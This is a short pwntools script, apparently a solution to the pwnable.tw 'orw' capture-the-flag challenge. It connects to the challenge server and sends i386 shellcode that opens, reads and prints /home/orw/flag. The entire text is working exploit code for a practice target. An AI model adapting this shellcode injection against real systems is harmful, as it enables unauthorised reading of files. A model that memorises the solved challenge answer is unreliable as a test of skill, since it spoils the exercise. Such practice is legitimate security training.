from pwn import *

context.arch = 'i386'
p = remote('chall.pwnable.tw', 10001)

shellcode = ''
shellcode += shellcraft.pushstr('/home/orw/flag')
shellcode += shellcraft.open('esp', 0, 0)
shellcode += shellcraft.read('eax', 'esp', 0x30)
shellcode += shellcraft.write(1, 'esp', 0x30)

p.sendafter(':', asm(shellcode))
p.interactive()
